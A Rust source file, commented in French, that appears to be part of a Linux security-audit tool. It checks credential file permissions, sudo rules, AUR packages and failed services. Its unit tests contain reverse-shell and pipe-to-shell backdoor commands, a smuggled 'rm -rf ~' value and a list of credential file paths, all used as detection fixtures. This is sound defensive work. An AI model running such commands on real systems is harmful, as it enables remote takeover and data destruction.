/// Fichiers qui contiennent des mots de passe ou des jetons d'accès, chemin relatif au dossier personnel.
const SECRETS: &[&str] = &[
    ".git-credentials",
    ".netrc",
    ".pgpass",
    ".my.cnf",
    ".npmrc",
    ".pypirc",
    ".aws/credentials",
    ".docker/config.json",
    ".kube/config",
    ".config/gh/hosts.yml",
    ".config/rclone/rclone.conf",
    ".gnupg",
];

/// Un secret est mal protégé si le groupe ou les autres utilisateurs peuvent le lire (ou y entrer, pour un dossier).
fn secret_expose(mode: u32) -> bool {
    mode & 0o077 != 0
}

fn fichiers_secrets() -> Vec<Constat> {
    use std::os::unix::fs::PermissionsExt;
    let maison = Path::new(&home()).to_path_buf();
    let mut exposes = Vec::new();
    let mut commandes = Vec::new();
    for nom in SECRETS {
        let chemin = maison.join(nom);
        // Droits du fichier lui-même, pas du lien : un lien symbolique (stow, chezmoi…) a toujours 777,
        // ce qui donnait une fausse alerte, jamais corrigée par le chmod.
        let Ok(meta) = std::fs::metadata(&chemin) else {
            continue;
        };
        if secret_expose(meta.permissions().mode()) {
            exposes.push(format!("~/{nom}"));
            commandes.push(format!("chmod {} ~/{nom}", if meta.is_dir() { "700" } else { "600" }));
        }
    }
    let mut constats = Vec::new();
    if !exposes.is_empty() {
        let cmds: Vec<&str> = commandes.iter().map(String::as_str).collect();
        constats.push(
            alerte(
                "Fichiers secrets",
                Niveau::Eleve,
                trf!(
                    "Lisible(s) par d'autres comptes : {} (mots de passe ou jetons d'accès).",
                    "Readable by other accounts: {} (passwords or access tokens).",
                    exposes.join(", ")
                ),
            )
            .corriger(
                tr!("Réserver ces fichiers à toi seul", "Restrict these files to you only"),
                &cmds,
            ),
        );
    }
    // Le dossier personnel lui-même : ouvert en lecture, il laisse voir tous tes fichiers aux autres comptes.
    if std::fs::metadata(&maison).is_ok_and(|m| m.permissions().mode() & 0o007 != 0) {
        constats.push(
            alerte(
                "Fichiers secrets",
                Niveau::Info,
                tr!(
                    "Ton dossier personnel est lisible par les autres comptes de la machine.",
                    "Your home folder is readable by the other accounts of the machine."
                ),
            )
            .corriger(
                tr!(
                    "Fermer ton dossier personnel aux autres comptes",
                    "Close your home folder to the other accounts"
                ),
                &["chmod 750 ~"],
            ),
        );
    }
    if constats.is_empty() {
        constats.push(ok(
            "Fichiers secrets",
            tr!(
                "Fichiers de mots de passe et de jetons protégés.",
                "Password and token files are protected."
            ),
        ));
    }
    constats
}

/// Groupes qui donnent en pratique les droits root sans mot de passe.
fn groupes_privilegies() -> Option<Constat> {
    let groupes = sortie("id", &["-nG"])?;
    let risques: Vec<&str> = groupes
        .split_whitespace()
        .filter(|g| matches!(*g, "docker" | "lxd" | "incus-admin"))
        .collect();
    Some(if risques.is_empty() {
        ok(
            "Groupes",
            tr!(
                "Aucun groupe qui donne les droits root sans mot de passe.",
                "No group gives root rights without a password."
            ),
        )
    } else {
        alerte(
            "Groupes",
            Niveau::Moyen,
            trf!(
                "Tu es dans le groupe {} : tout programme lancé par toi peut devenir root sans mot de passe (via un conteneur).", "You are in the {} group: any program you run can become root without a password (through a container).",
                risques.join(", ")
            ),
        )
        .manuel(
            tr!("Si tu n'utilises pas Docker au quotidien, sors du groupe (Docker demandera alors sudo) ; sinon, garde-le en connaissance de cause", "If you do not use Docker every day, leave the group (Docker will then ask for sudo); otherwise, keep it knowingly"),
            &[&format!("sudo gpasswd -d $USER {}", risques.first().copied().unwrap_or("docker"))],
        )
    })
}

/// Règles « sudo sans mot de passe » : (règles qui donnent tout, règles limitées à des commandes précises).
fn regles_nopasswd(liste: &str) -> (Vec<String>, usize) {
    let mut totales = Vec::new();
    let mut limitees = 0;
    for l in liste.lines().map(str::trim).filter(|l| l.contains("NOPASSWD:")) {
        let commandes = l.split_once("NOPASSWD:").map_or("", |(_, c)| c).trim();
        if commandes == "ALL" || commandes.starts_with("ALL,") {
            totales.push(l.to_string());
        } else {
            limitees += 1;
        }
    }
    (totales, limitees)
}

fn sudo_sans_mot_de_passe() -> Option<Constat> {
    // -n : jamais de demande de mot de passe. Sans règle NOPASSWD (ni sudo récent), la liste est refusée : rien à dire.
    let liste = sortie("sudo", &["-n", "-l"])?;
    let (totales, limitees) = regles_nopasswd(&liste);
    Some(if !totales.is_empty() {
        alerte(
            "Sudo",
            Niveau::Eleve,
            tr!("sudo sans mot de passe pour TOUTES les commandes : n'importe quel programme lancé par toi peut devenir root.", "sudo without a password for ALL commands: any program you run can become root."),
        )
        .manuel(
            tr!("Retirer « NOPASSWD: » de cette règle dans /etc/sudoers.d (toujours avec sudo visudo, jamais à la main)", "Remove “NOPASSWD:” from this rule in /etc/sudoers.d (always with sudo visudo, never by hand)"),
            &["sudo visudo"],
        )
    } else if limitees > 0 {
        ok(
            "Sudo",
            trf!(
                "{limitees} règle(s) sudo sans mot de passe, limitée(s) à des commandes précises.",
                "{limitees} passwordless sudo rule(s), limited to specific commands."
            ),
        )
    } else {
        ok(
            "Sudo",
            tr!(
                "sudo demande toujours le mot de passe.",
                "sudo always asks for the password."
            ),
        )
    })
}

/// Paquets AUR introuvables dans la réponse de l'AUR (retirés ou construits à la main) et paquets orphelins.
fn etat_aur(installes: &[&str], reponse: &serde_json::Value) -> (Vec<String>, Vec<String>) {
    let resultats: Vec<&serde_json::Value> = reponse["results"].as_array().into_iter().flatten().collect();
    let absents = installes
        .iter()
        .filter(|n| !resultats.iter().any(|r| r["Name"].as_str() == Some(**n)))
        .map(std::string::ToString::to_string)
        .collect();
    let orphelins = resultats
        .iter()
        .filter(|r| r["Maintainer"].is_null())
        .filter_map(|r| r["Name"].as_str().map(str::to_string))
        .collect();
    (absents, orphelins)
}

/// Encode un nom pour une adresse web : « libc++ » doit devenir « libc%2B%2B », sinon « + » est lu comme une
/// espace et le paquet passe pour absent de l'AUR (vérifié sur aewm++).
fn encoder_url(texte: &str) -> String {
    texte
        .bytes()
        .map(|o| match o {
            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'_' | b'.' | b'~' => (o as char).to_string(),
            _ => format!("%{o:02X}"),
        })
        .collect()
}

/// Un paquet retiré de l'AUR ne reçoit plus jamais de mise à jour, sans que rien ne prévienne.
fn paquets_aur() -> Option<Constat> {
    if Paquets::detecter() != Some(Paquets::Pacman) {
        return None;
    }
    let liste = sortie("pacman", &["-Qmq"])?;
    let installes: Vec<&str> = liste.lines().filter(|l| !l.is_empty()).collect();
    if installes.is_empty() {
        return None;
    }
    // Même requête que yay ou paru : seuls les noms des paquets partent vers aur.archlinux.org.
    // Par lots de 100, pour ne pas dépasser la longueur maximale d'une adresse.
    let mut resultats = Vec::new();
    for lot in installes.chunks(100) {
        let requete = format!(
            "https://aur.archlinux.org/rpc/v5/info?{}",
            lot.iter()
                .map(|n| format!("arg[]={}", encoder_url(n)))
                .collect::<Vec<_>>()
                .join("&")
        );
        let Some(json) = sortie_delai("curl", &["-fsS", "--max-time", "20", &requete], 25, &[0])
            .and_then(|t| serde_json::from_str::<serde_json::Value>(&t).ok())
        else {
            return Some(impossible(
                "Paquets AUR",
                tr!("AUR injoignable, hors ligne ?", "AUR unreachable, offline?"),
            ));
        };
        resultats.extend(json["results"].as_array().cloned().unwrap_or_default());
    }
    let (absents, orphelins) = etat_aur(&installes, &serde_json::json!({ "results": resultats }));
    Some(if !absents.is_empty() {
        alerte(
            "Paquets AUR",
            Niveau::Moyen,
            trf!(
                "Absent(s) de l'AUR : {} (retiré, ou construit à la main) : plus aucune mise à jour automatique.",
                "Missing from the AUR: {} (removed, or built by hand): no more automatic updates.",
                absents.join(", ")
            ),
        )
        .manuel(
            tr!(
                "Vérifier si un paquet de remplacement existe, sinon le désinstaller s'il n'est plus utile",
                "Check whether a replacement package exists, otherwise uninstall it if no longer needed"
            ),
            &["pacman -Qm"],
        )
    } else if !orphelins.is_empty() {
        alerte(
            "Paquets AUR",
            Niveau::Info,
            trf!(
                "Paquet(s) AUR sans mainteneur : {} (les mises à jour risquent de s'arrêter).",
                "Orphaned AUR package(s): {} (updates may stop).",
                orphelins.join(", ")
            ),
        )
    } else {
        ok(
            "Paquets AUR",
            trf!(
                "Les {} paquets AUR installés sont tous suivis dans l'AUR.",
                "The {} installed AUR packages are all tracked in the AUR.",
                installes.len()
            ),
        )
    })
}

fn services_en_echec() -> Constat {
    if !systemd() {
        return impossible("Services", tr!("systemd absent", "systemd missing"));
    }
    let Some(liste) = sortie("systemctl", &["--failed", "--no-legend", "--plain"]) else {
        return impossible("Services", tr!("systemctl n'a pas répondu", "systemctl did not answer"));
    };
    let n = liste.lines().filter(|l| !l.trim().is_empty()).count();
    if n == 0 {
        ok(
            "Services",
            tr!("Aucun service système en échec.", "No failed system service."),
        )
    } else {
        alerte(
            "Services",
            Niveau::Info,
            trf!("{n} service(s) en échec.", "{n} failed service(s)."),
        )
        .manuel(
            tr!("Voir lesquels et leurs erreurs", "See which ones and their errors"),
            &["systemctl --failed"],
        )
    }
}

pub fn auditer() -> Audit {
    let feu = pare_feu();
    let feu_actif = feu.probleme.is_none();
    let mut constats = vec![feu];
    constats.extend(ports_ecoute(feu_actif, feu_actif && ufw_actif()));
    constats.extend(docker());
    constats.push(ssh_serveur());
    constats.push(mises_a_jour());
    constats.push(failles_connues());
    constats.extend(autres_mises_a_jour());
    constats.push(redemarrage());
    constats.push(chiffrement_disque());
    constats.extend(verrouillage_ecran());
    constats.push(durcissement_noyau());
    constats.push(module_securite());
    constats.push(sauvegardes());
    constats.extend(fichiers_suspects());
    constats.extend(persistance());
    constats.push(demarrage_securise());
    constats.extend(cles_ssh());
    constats.extend(fichiers_secrets());
    constats.push(processeur());
    constats.extend(groupes_privilegies());
    constats.extend(sudo_sans_mot_de_passe());
    constats.extend(paquets_aur());
    constats.push(comptes());
    constats.extend(wifi(crate::scan::passerelle().map(|g| g.to_string())));
    constats.push(services_en_echec());
    constats.extend(super::dns::dns());
    constats.extend(super::certificats::certificats());
    constats.extend(super::extensions::extensions());

    Audit {
        systeme: NOM,
        score: score(&constats),
        constats,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn modules_dkms_par_noyau() {
        let noyaux = ["7.2.5-arch1".to_string(), "7.3.0-arch1".to_string()];
        let status = "nvidia/610.57.04, 7.2.5-arch1, x86_64: installed\n\
                      nvidia/610.57.04, 7.3.0-arch1, x86_64: built\n\
                      hid-xpadneo/v0.10.4, 7.2.5-arch1, x86_64: installed\n\
                      hid-xpadneo/v0.10.4, 7.3.0-arch1, x86_64: installed (WARNING! Diff between built and installed module!)\n\
                      vboxhost/7.1: added\n\
                      ancien, 1.0, 7.2.5-arch1, x86_64: installed\n";
        assert_eq!(
            dkms_manquants(status, &noyaux),
            [
                ("nvidia".to_string(), vec!["7.3.0-arch1".to_string()]),
                ("hid-xpadneo".to_string(), vec![]),
                ("vboxhost".to_string(), noyaux.to_vec()),
                ("ancien".to_string(), vec!["7.3.0-arch1".to_string()]),
            ]
        );
    }

    #[test]
    fn ports_docker() {
        let c = "0.0.0.0:8080->80/tcp, [::]:8080->80/tcp, 127.0.0.1:3389->3389/tcp, 0.0.0.0:53->53/udp, 9000/tcp";
        assert_eq!(ports_docker_exposes(c), vec!["8080/tcp", "53/udp"]);
        assert_eq!(
            ports_docker_exposes("127.0.0.1:8006->8006/tcp, [::1]:8006->8006/tcp"),
            [] as [std::string::String; 0]
        );
        // Publié sur l'IP du réseau local : exposé aussi.
        assert_eq!(ports_docker_exposes("10.0.0.179:8080->80/tcp"), vec!["8080/tcp"]);
        assert_eq!(ports_docker_exposes(":::9000->9000/tcp"), vec!["9000/tcp"]);
        assert_eq!(ports_docker_exposes(""), [] as [std::string::String; 0]);
    }

    #[test]
    fn docker_lu_sans_le_groupe_docker() {
        let p = |nom: &str, args: &str| (nom.to_string(), args.split(' ').map(str::to_string).collect::<Vec<_>>());
        let dockerd = p("dockerd", "/usr/bin/dockerd -H fd://");
        let shim = p("containerd-shim", "/usr/bin/containerd-shim-runc-v2 -namespace moby");
        let local = p(
            "docker-proxy",
            "/usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 8006 -container-ip 172.17.0.2 -container-port 8006",
        );
        let ouvert = p(
            "docker-proxy",
            "/usr/bin/docker-proxy -proto udp -host-ip 0.0.0.0 -host-port 53 -container-ip 172.17.0.3 -container-port 53",
        );
        // Démon actif, aucun conteneur : vérifié, rien à signaler.
        let c = docker_sans_acces(std::slice::from_ref(&dockerd));
        assert!(c.verifie && c.probleme.is_none());
        // Conteneur publié seulement en local : rien à signaler.
        let c = docker_sans_acces(&[dockerd.clone(), shim.clone(), local.clone()]);
        assert!(c.verifie && c.probleme.is_none());
        // Port publié sur toutes les interfaces : alerte, avec le port.
        let c = docker_sans_acces(&[dockerd.clone(), shim, local, ouvert]);
        assert_eq!(c.probleme, Some(Niveau::Eleve));
        assert!(c.message.contains("53/udp") && !c.message.contains("8006"));
        // Processus des autres comptes invisibles (hidepid) : on ne conclut pas.
        assert!(!docker_sans_acces(&[]).verifie);
    }

    #[test]
    fn failles_du_processeur() {
        let etats = vec![
            ("meltdown".to_string(), "Not affected\n".to_string()),
            ("spectre_v2".to_string(), "Mitigation: Enhanced IBRS\n".to_string()),
            (
                "mds".to_string(),
                "Vulnerable: Clear CPU buffers attempted, no microcode\n".to_string(),
            ),
        ];
        assert_eq!(failles_vulnerables(&etats), vec!["mds"]);
    }

    #[test]
    fn droits_des_secrets() {
        assert!(!secret_expose(0o100_600));
        assert!(!secret_expose(0o40700));
        assert!(secret_expose(0o100_644));
        assert!(secret_expose(0o100_640));
    }

    #[test]
    fn regles_sudo() {
        let omarchy = "User alice may run the following commands on portable:\n    (ALL) ALL\n    (root) NOPASSWD: /usr/bin/omarchy-dns Cloudflare, /usr/bin/omarchy-dns DHCP\n";
        assert_eq!(regles_nopasswd(omarchy), (vec![], 1));
        let tout = "    (ALL : ALL) NOPASSWD: ALL\n";
        assert_eq!(regles_nopasswd(tout).0.len(), 1);
    }

    #[test]
    fn reglage_remote_play() {
        assert_eq!(enable_streaming("\t\t\"EnableStreaming\"\t\t\"0\"\n"), Some(false));
        assert_eq!(
            enable_streaming("\"x\" \"y\"\n\t\"EnableStreaming\"\t\"1\""),
            Some(true)
        );
        assert_eq!(enable_streaming("\"Autre\"\t\"1\""), None);
    }

    #[test]
    fn chemins_avant_fusion_de_usr() {
        assert_eq!(
            chemin_hors_usr(Path::new("/usr/bin/fusermount3")).unwrap(),
            Path::new("/bin/fusermount3")
        );
        assert_eq!(chemin_hors_usr(Path::new("/usr/sbin/x")).unwrap(), Path::new("/sbin/x"));
        assert!(chemin_hors_usr(Path::new("/usr/local/bin/x")).is_none());
        assert!(chemin_hors_usr(Path::new("/opt/x")).is_none());
    }

    #[test]
    fn noms_encodes_pour_l_aur() {
        assert_eq!(encoder_url("aewm++"), "aewm%2B%2B");
        assert_eq!(encoder_url("python-foo_bar.1"), "python-foo_bar.1");
        assert_eq!(encoder_url("a@b"), "a%40b");
    }

    #[test]
    fn suivi_aur() {
        let reponse = serde_json::json!({"results": [
            {"Name": "nextdns-bin", "Maintainer": "quelquun"},
            {"Name": "vieux-outil", "Maintainer": null}
        ]});
        let (absents, orphelins) = etat_aur(&["nextdns-bin", "vieux-outil", "fait-maison"], &reponse);
        assert_eq!(absents, vec!["fait-maison"]);
        assert_eq!(orphelins, vec!["vieux-outil"]);
    }

    #[test]
    fn reglages_du_noyau() {
        let lu = |c: &str| Some(if c == "kernel/kptr_restrict" { 0 } else { 2 });
        let faibles = reglages_faibles(lu);
        assert_eq!(faibles.len(), 1);
        assert_eq!(faibles[0].0, "kernel/kptr_restrict");
        // Réglage absent (noyau sans Yama…) : ni faible ni fort, on ne conclut pas.
        assert_eq!(reglages_faibles(|_| None), [] as [(&str, i64, i64, &str); 0]);
    }

    #[test]
    fn path_piegeable() {
        let droits = |d: &str| match d {
            "/tmp" => Some(0o41777),         // modifiable par tous mais « sticky » : sûr
            "/srv/partage" => Some(0o40777), // modifiable par tous, sans sticky : piège
            _ => Some(0o40755),
        };
        assert_eq!(
            path_dangereux("/usr/bin:/tmp:/srv/partage:.::/bin", droits),
            vec!["/srv/partage", ".", "(vide = dossier courant)"]
        );
        assert_eq!(
            path_dangereux("/usr/local/bin:/usr/bin", droits),
            [] as [std::string::String; 0]
        );
    }

    #[test]
    fn minuteries_de_sauvegarde() {
        assert_eq!(type_sauvegarde("backup-home.timer"), Some(true));
        assert_eq!(type_sauvegarde("restic-nuit.timer"), Some(true));
        assert_eq!(type_sauvegarde("snapper-timeline.timer"), Some(false));
        assert_eq!(type_sauvegarde("snapper-cleanup.timer"), None);
        assert_eq!(type_sauvegarde("fstrim.timer"), None);
    }

    #[test]
    fn sysctl_garde_les_reglages_precedents() {
        let existant = "# sentinel\nkernel.kptr_restrict = 1\nkernel.dmesg_restrict=0\nmauvais = $(rm -rf ~)\n";
        let nouveaux = [
            ("kernel.dmesg_restrict".to_string(), 1),
            ("fs.protected_symlinks".to_string(), 1),
        ];
        assert_eq!(
            fusion_sysctl(existant, &nouveaux),
            "kernel.kptr_restrict = 1\nkernel.dmesg_restrict = 1\nfs.protected_symlinks = 1\n"
        );
        assert_eq!(fusion_sysctl("", &nouveaux[..1]), "kernel.dmesg_restrict = 1\n");
    }

    #[test]
    fn politique_du_pare_feu() {
        assert_eq!(
            politique_ufw("# commentaire\nDEFAULT_INPUT_POLICY=\"DROP\"\n").as_deref(),
            Some("DROP")
        );
        assert_eq!(
            politique_ufw("DEFAULT_INPUT_POLICY=\"accept\"").as_deref(),
            Some("ACCEPT")
        );
        assert_eq!(politique_ufw("rien"), None);
    }

    #[test]
    fn delai_respecte() {
        let debut = std::time::Instant::now();
        assert!(sortie_delai("sleep", &["5"], 1, &[0]).is_none());
        assert!(debut.elapsed().as_secs() < 3);
        assert_eq!(
            sortie_delai("echo", &["bonjour"], 5, &[0]).as_deref(),
            Some("bonjour\n")
        );
        // Une commande en échec n'est jamais une réponse, sauf code explicitement accepté.
        assert!(sortie_delai("sh", &["-c", "echo rien; exit 1"], 5, &[0]).is_none());
        assert_eq!(sortie_delai("sh", &["-c", "exit 1"], 5, &[0, 1]).as_deref(), Some(""));
    }

    #[test]
    fn failles_des_distributions() {
        let arch = serde_json::json!([
            {"packages": ["openssl", "lib32-openssl"], "severity": "High", "fixed": "3.5.1-1", "status": "Fixed"},
            {"packages": ["pam"], "severity": "High", "fixed": null, "status": "Vulnerable"},
            {"packages": ["lua51"], "severity": "Low", "fixed": null}
        ]);
        let f = failles_arch(&arch);
        assert_eq!(f.len(), 4);
        assert!(f[0].corrigee && f[0].gravite == Niveau::Eleve && f[1].paquet == "lib32-openssl");
        assert!(!f[2].corrigee && f[3].gravite == Niveau::Info);

        let apt = [
            "libssl3t64/noble-updates,noble-security 3.0.13-0ubuntu3.4 amd64 [upgradable from: 3.0.13-0ubuntu3.1]",
            "firefox/noble-updates 1:1snap1 amd64 [upgradable from: 1:1snap0]",
            "openssl/stable-security 3.0.15-1~deb12u1 amd64 [upgradable from: 3.0.14-1~deb12u2]",
        ]
        .map(String::from);
        let noms: Vec<String> = failles_apt(&apt).into_iter().map(|f| f.paquet).collect();
        assert_eq!(noms, ["libssl3t64", "openssl"]);

        let dnf4 = "FEDORA-2024-1a2b Important/Sec. curl-8.6.0-7.fc40.x86_64\nFEDORA-2024-9f9f bugfix   bash-5.2-1.fc40.x86_64\n";
        assert_eq!(
            failles_dnf(dnf4),
            [Faille {
                paquet: "curl".into(),
                gravite: Niveau::Eleve,
                corrigee: true
            }]
        );
        let dnf5 = "Name             Type     Severity  Package                         Issued\n\
                    FEDORA-2024-1a2b security Critical  python3-libs-3.12.4-1.fc40.x86_64 2024-04-01 00:43:20\n";
        let f = failles_dnf(dnf5);
        assert_eq!((f[0].paquet.as_str(), f[0].gravite), ("python3-libs", Niveau::Critique));

        let zypper = "Repository | Name                  | Category    | Severity  | Interactive | Status     | Summary\n\
                      -----------+-----------------------+-------------+-----------+-------------+------------+--------\n\
                      Update     | openSUSE-2024-123     | security    | important | ---         | needed     | openssl\n\
                      Update     | openSUSE-2024-124     | security    | low       | ---         | applied    | curl\n\
                      Update     | openSUSE-2024-125     | recommended | moderate  | ---         | needed     | vim\n";
        let f = failles_zypper(zypper);
        assert_eq!(f.len(), 1);
        assert_eq!(
            (f[0].paquet.as_str(), f[0].gravite),
            ("openSUSE-2024-123", Niveau::Eleve)
        );
    }

    #[test]
    fn bilan_des_failles() {
        let f = |paquet: &str, gravite, corrigee| Faille {
            paquet: paquet.into(),
            gravite,
            corrigee,
        };
        assert!(bilan_failles(Paquets::Pacman, &[]).probleme.is_none());
        // Faille sans correctif : signalée, sans baisser la note ni proposer de correction.
        let c = bilan_failles(Paquets::Pacman, &[f("pam", Niveau::Eleve, false)]);
        assert_eq!(c.probleme, Some(Niveau::Info));
        assert!(c.correctif.is_none() && c.message.contains("pam"));
        // La pire gravité des failles corrigées donne le niveau ; jamais moins que Moyen.
        let c = bilan_failles(
            Paquets::Dnf,
            &[
                f("curl", Niveau::Info, true),
                f("curl", Niveau::Critique, true),
                f("pam", Niveau::Eleve, false),
            ],
        );
        assert_eq!(c.probleme, Some(Niveau::Critique));
        assert!(c.message.starts_with("1 paquet(s)") && c.message.contains("pam") && c.correctif.is_some());
        assert_eq!(
            bilan_failles(Paquets::Apt, &[f("vim", Niveau::Info, true)]).probleme,
            Some(Niveau::Moyen)
        );
    }

    #[test]
    fn programmes_privilegies() {
        assert_eq!(
            fichiers_capacites(
                "/usr/bin/newuidmap cap_setuid=ep\n/usr/bin/ping = cap_net_raw+ep\n/tmp/un dossier/x cap_sys_admin=ep\n"
            ),
            ["/usr/bin/newuidmap", "/usr/bin/ping", "/tmp/un dossier/x"].map(std::path::PathBuf::from)
        );
        assert_eq!(
            paquet_dpkg("libc6:amd64, libc6-dbg: /usr/bin/ldd\n").as_deref(),
            Some("libc6:amd64")
        );
        assert_eq!(
            paquet_dpkg("diversion by dash from: /bin/sh\ndash: /bin/sh\n").as_deref(),
            Some("dash")
        );
        let mtree = "#mtree\n./usr/bin/sudoedit time=1.0 type=link link=sudo\n./usr/bin/sudo time=1.0 mode=4755 sha256digest=e9f8\n";
        assert_eq!(
            empreinte_mtree(mtree, Path::new("/usr/bin/sudo")).as_deref(),
            Some("e9f8")
        );
        assert_eq!(empreinte_mtree(mtree, Path::new("/usr/bin/sudoedit")), None);
        // Seul « 5 » (contenu) compte : une date ou des droits changés ne prouvent pas un remplacement.
        let verif = "??5??????   /usr/bin/passwd\n.M.......   /usr/bin/su\nS.5....T.  c /etc/sudoers\n";
        assert!(contenu_modifie(verif, Path::new("/usr/bin/passwd")));
        assert!(!contenu_modifie(verif, Path::new("/usr/bin/su")));
        assert!(!contenu_modifie(verif, Path::new("/usr/bin/mount")));
    }

    #[test]
    fn lancements_suspects() {
        // Formes de porte dérobée reconnues partout.
        assert!(commande_suspecte("bash -c 'bash -i >& /dev/tcp/1.2.3.4/4444 0>&1'", false).is_some());
        assert!(commande_suspecte("nc -e /bin/sh 1.2.3.4 4444", false).is_some());
        assert!(commande_suspecte("curl -fsSL https://x.example/a | sh", false).is_some());
        assert!(commande_suspecte("wget -qO- http://x | /bin/bash", false).is_some());
        assert!(commande_suspecte("echo aGk= | base64 -d | sh", false).is_some());
        // Pas des portes dérobées : curl sans exécution, nc sans shell, grep après curl.
        assert!(commande_suspecte("curl -fsS https://x/a.json | jq .", false).is_none());
        assert!(commande_suspecte("nc -z 10.0.0.1 22", false).is_none());
        assert!(commande_suspecte("export TMPDIR=/tmp/moi", false).is_none());
        // Programme lancé depuis /tmp ou un dossier caché : seulement pour une commande lancée.
        assert!(commande_suspecte("/tmp/.x/run --daemon", true).is_some());
        assert!(commande_suspecte("-/dev/shm/a", true).is_some());
        assert!(commande_suspecte("~/.cache/.u/agent", true).is_some());
        assert!(commande_suspecte("%h/.mozilla/x", true).is_some());
        assert!(commande_suspecte("~/.local/bin/plein-ecran", true).is_none());
        assert!(commande_suspecte("%h/.cargo/bin/sentinel surveiller", true).is_none());
        assert!(commande_suspecte("/usr/bin/xrandr --output DP-1", true).is_none());
        assert!(commande_suspecte("cd /tmp/x", false).is_none());
    }

    #[test]
    fn lignes_de_demarrage() {
        assert_eq!(
            commande_lancee("ExecStart=-/usr/bin/foo -x").as_deref(),
            Some("-/usr/bin/foo -x")
        );
        assert_eq!(
            commande_lancee("Exec=steam -silent %U").as_deref(),
            Some("steam -silent %U")
        );
        assert_eq!(commande_lancee("exec-once = waybar").as_deref(), Some("waybar"));
        assert_eq!(
            commande_lancee(r#"o.exec_on_start("~/.local/bin/plein-ecran")"#).as_deref(),
            Some("~/.local/bin/plein-ecran")
        );
        assert_eq!(commande_lancee(r#"-- o.launch_on_start("my-service")"#), None);
        assert_eq!(commande_lancee("# ExecStart=/tmp/x"), None);
        assert_eq!(commande_lancee("Description=Exec=/tmp/x"), None);
        assert_eq!(commande_lancee("Name=Steam"), None);
        assert!(definit_prechargement("export LD_PRELOAD=/home/x/.l/libz.so"));
        assert!(definit_prechargement("env = LD_PRELOAD,/tmp/a.so"));
        assert!(!definit_prechargement("unset LD_PRELOAD"));
        assert!(!definit_prechargement("# LD_PRELOAD=/x"));
    }
}
